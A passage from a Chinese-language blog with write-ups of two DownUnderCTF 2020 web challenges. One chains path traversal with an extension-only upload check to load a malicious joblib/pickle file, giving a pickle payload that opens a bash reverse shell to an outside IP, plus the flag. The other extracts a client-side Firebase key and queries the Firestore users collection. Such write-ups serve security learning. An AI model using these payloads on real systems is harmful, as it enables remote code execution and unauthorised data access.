        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/22/DownunderCTF-2020-Web-Taking-stock/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/22/DownunderCTF-2020-Web-Taking-stock/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>DownunderCTF 2020 Taking-stock。给了一个train.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t upload this file to production.</span></span><br><span class="line"><span class="comment"># Train models locally and copy them into the deployment</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">import</span> quandl</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">WINDOW = <span class="number">30</span></span><br><span class="line">quandl.ApiConfig.api_key = <span class="string">&quot;REDACTED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">name, cache=True</span>):</span></span><br><span class="line">    fn = <span class="string">f&#x27;<span class="subst">&#123;name.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>)&#125;</span>.cache.joblib&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(fn):</span><br><span class="line">            df = joblib.load(fn)</span><br><span class="line">            <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    df = quandl.get(name)</span><br><span class="line">    joblib.dump(df, fn)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_model</span>(<span class="params">data</span>):</span></span><br><span class="line">    df = data[[<span class="string">&#x27;Adj. Close&#x27;</span>]]</span><br><span class="line">    df[<span class="string">&#x27;Prediction&#x27;</span>] = df[[<span class="string">&#x27;Adj. Close&#x27;</span>]].shift(-WINDOW)</span><br><span class="line"></span><br><span class="line">    ds = np.array(df.drop([<span class="string">&#x27;Prediction&#x27;</span>], <span class="number">1</span>))</span><br><span class="line">    ds = ds[:-WINDOW]</span><br><span class="line">    </span><br><span class="line">    lb = np.array(df[<span class="string">&#x27;Prediction&#x27;</span>])</span><br><span class="line">    lb = lb[:-WINDOW]</span><br><span class="line">    </span><br><span class="line">    ds_train, ds_test, lb_train, lb_test = train_test_split(ds, lb, test_size=<span class="number">0.2</span>)</span><br><span class="line">    </span><br><span class="line">    model = LinearRegression()</span><br><span class="line">    model.fit(ds_train, lb_train)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    stock = sys.argv[<span class="number">1</span>]</span><br><span class="line">    stock_name = stock.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    use_cache = len(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&#x27;--no-cache&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = get_data(stock, cache=sys.argv)</span><br><span class="line">    model = get_model(data)</span><br><span class="line">    joblib.dump(model, <span class="string">f&#x27;<span class="subst">&#123;stock_name&#125;</span>.joblib&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>打开是一个股票预测界面，输入数值后会根据输入预测变化情况。然后我们发现有个登录，随手一发SSTI<code>&#123;9*9&#125;</code>，结果没那么简单，原样输出了。然后有个上传，只能是PNG。但是仅验证了文件后缀。</p>
<p>抓包发现，首次登陆后的Me页面里会GET/profile-picture/{uuid}，然后返回No such file /tmp/{uuid}.png，我们上传的文件会保存在/tmp目录下。然后注意到奇怪的事情，我们把uuid改了，</p>
<p>还会正常显示上传的图片。很明显，/profile-picture还会判断Cookie。我们解一下Cookie，明显Flask的。<code>"eyJpZCI6IjgxMDM1M2JiLTc4NmMtNGIzYi05N2IwLTIyMWI5ODFhODZiYyIsInVzZXJuYW1lIjoie3s5Kjl9fSJ9.X2laXw.PxXhwXbzp8aKXJeUIXaQFoUgrrM"</code>的结果是<code>&#123;"id":"810353bb-786c-4b3b-97b0-221b981a86bc","username":"&#123;&#123;9*9&#125;&#125;"&#125;</code>。但是目前上传没太多作用，找不到什么序列化或者LFI的。</p>
<p>回头看股票预测页面，有四个选项，Google Facebook Apple Amazon，我们点Predict的时候，会POST prices和stock（不过很奇怪，我在本地做的时候Burpsuite抓不到包），我们把stock改成../../../../../../../../etc/passwd，提示<code>Failed to load ./models/../../../../../../../../etc/passwd</code>，LFI。</p>
<p>LFI有了，文件上传有了，然后干什么？给的那个train.py还没看呢。</p>
<p>joblib是啥？参考<a target="_blank" rel="noopener" href="https://joblib.readthedocs.io/en/latest/generated/joblib.load.html">文档</a>，是一套并行运行的工具库，我们重点关注这里用的load函数。文档明确提示使用pickle，那就好办了。不知道能否有回显，我们直接反弹shell。</p>
<p>先写好模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        cmd = (<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.50.186/6379 0&gt;&amp;1&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> os.system, (cmd,)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后pickle 生成序列化文件，上传文件（记得改后缀名），最后predict修改引用的模型为我们上传的Payload即可弹shell。</p>

    <div id="aplayer-Fjlngvkc" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="1296550461" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{8b378ef6-ad0b-42b2-acb7-9ea7a122fd54}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/21/DownunderCTF-2020-Web-CookieClicker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/21/DownunderCTF-2020-Web-CookieClicker/" class="post-title-link" itemprop="url">DownunderCTF-Web-CookieClicker</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-09-21 17:10:18" itemprop="dateCreated datePublished" datetime="2020-09-21T17:10:18+08:00">2020-09-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-09-22 16:47:07" itemprop="dateModified" datetime="2020-09-22T16:47:07+08:00">2020-09-22</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/21/DownunderCTF-2020-Web-CookieClicker/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/21/DownunderCTF-2020-Web-CookieClicker/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>12k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>10 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>DownUnderCTF 2020的CookieClicker。（这题做Docker后面需要适配，因为用到了Google Firebase）</p>
<p>打开后让我们登录或注册，注意到favicon那个Angular的标志，猜测这题是用Angular写的Web Server。</p>
<p>观察发起的网络连接后，注意到频繁访问firebase，firebase是什么？简单来说是Google推出的在线数据库，CRUD操作可以通过HTTP请求完成。</p>
<p>我们试着在JS中找一下Firebase的东西，发现Token：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> environment = &#123;</span><br><span class="line">    production: <span class="literal">false</span>,</span><br><span class="line">    firebase: &#123;</span><br><span class="line">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span><br><span class="line">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span><br><span class="line">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span><br><span class="line">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span><br><span class="line">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span><br><span class="line">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span><br><span class="line">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span><br><span class="line">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>现在我们可以访问firebase了，问题是怎么查？仅凭Token没办法登录到Firebase控制台，所以我们要通过Token来直接访问Firebase。由于我们只有API Key，参考<a target="_blank" rel="noopener" href="https://firebase.google.com/docs/web/setup#namespace">文档</a>，我们直接JavaScript操作。</p>
<p>先构建好Firebase操作模板：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>下一个问题是我们要操作哪种服务？Firebase提供了Realtime Database、Cloud Firestore、Storage等服务。当我们点击页面中的按钮时，会发出一些HTTP请求，发现URL都类似于<code>https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel?database=projects%2Fcookie-clicker1%2Fdatabases%2F(default)&amp;gsessionid=bcEeUU8DDzkPMaSO3JY1AW63FcU55neY&amp;VER=8&amp;RID=rpc&amp;SID=1IaLbjzhhQV21yMH-XFJoQ&amp;CI=0&amp;AID=64&amp;TYPE=xmlhttp&amp;zx=utdsowr3rn8s&amp;t=2</code>，发现有firestore，而且我们在main.js中搜索storage、firestore、database等关键词，只有firestore出现次数最多。就认为是它了。根据文档，Firestore不使用表的概念，而是用collections代替，我们需要知道collections的名称，但是Web端又不允许我们去获取collections。</p>
<p>那就再看HTTP请求，当我们点击Click更新计数时会发出一个POST请求： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/google.firestore.v1.Firestore/Listen/channel?database=projects%2Fcookie-clicker1%2Fdatabases%2F(default)&amp;VER=8&amp;RID=13388&amp;CVER=22&amp;X-HTTP-Session-Id=gsessionid&amp;%24httpHeaders=X-Goog-Api-Client%3Agl-js%2F%20fire%2F7.19.1%0D%0AContent-Type%3Atext%2Fplain%0D%0AAuthorization%3ABearer%20eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjkyMjM4LCJ1c2VyX2lkIjoiVnF4SE5QbHdLUVJwMkZ2Q1R6Z1h5MDhseGh2MiIsInN1YiI6IlZxeEhOUGx3S1FScDJGdkNUemdYeTA4bHhodjIiLCJpYXQiOjE2MDA2OTU1MzksImV4cCI6MTYwMDY5OTEzOSwiZW1haWwiOiJ0aWFvbm1tQHRlc3QuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbInRpYW9ubW1AdGVzdC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.MobthL1tQ2iJBgiyyMt-nigsmJrHPiIaDjkOQrSJgBNDZa77HyTfiXzA-Nc_ZNhKbkO_YXheAVoIIaBSvVcxhMr9Ce-rrcjta7Y3eLmbFI-_79LXEWMbM3K2ffDlPa1k2cGsLbwestARe2_7wyLNf4PfYMR9vHZtJRxMcx8IMs4XBXf4a8guAWSV-2pgw3Z02g5yvusiMxpZjCpON7qI_08xoiLNcc5YnqH1Raqd16FiFlbClzuYm33JnJpOw_7QCucRMtZk77pr5uUiNmNDBJCjS-V1o2u5cfta4imsmiMBMEtD9Com-1BCZv_HD2Qd1Rmy_0cZ71r3NuqaSwIx4w%0D%0A&amp;zx=la5nsuqm685b&amp;t=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: firestore.googleapis.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate, br</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 684</span><br><span class="line"><span class="attribute">Origin</span>: http://127.0.0.1:8528</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:8528/</span><br><span class="line"></span><br><span class="line">count=2&amp;ofs=0&amp;req0___data__=%7B%22database%22%3A%22projects%2Fcookie-clicker1%2Fdatabases%2F(default)%22%2C%22addTarget%22%3A%7B%22documents%22%3A%7B%22documents%22%3A%5B%22projects%2Fcookie-clicker1%2Fdatabases%2F(default)%2Fdocuments%2Fusers%2FVqxHNPlwKQRp2FvCTzgXy08lxhv2%22%5D%7D%2C%22targetId%22%3A2%2C%22resumeToken%22%3A%22CgkI4LfytK%2F66wI%3D%22%7D%7D&amp;req1___data__=%7B%22database%22%3A%22projects%2Fcookie-clicker1%2Fdatabases%2F(default)%22%2C%22addTarget%22%3A%7B%22documents%22%3A%7B%22documents%22%3A%5B%22projects%2Fcookie-clicker1%2Fdatabases%2F(default)%2Fdocuments%2Fcookies%2Ftotal%22%5D%7D%2C%22targetId%22%3A4%2C%22resumeToken%22%3A%22CgkI4LfytK%2F66wI%3D%22%7D%7D</span><br></pre></td></tr></table></figure> 可以看到有req0和req1两组数据。根据URL我们大胆猜测collections为users和cookies。那么，读数据吧。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> db=firebase.firestore();</span></span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;users&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
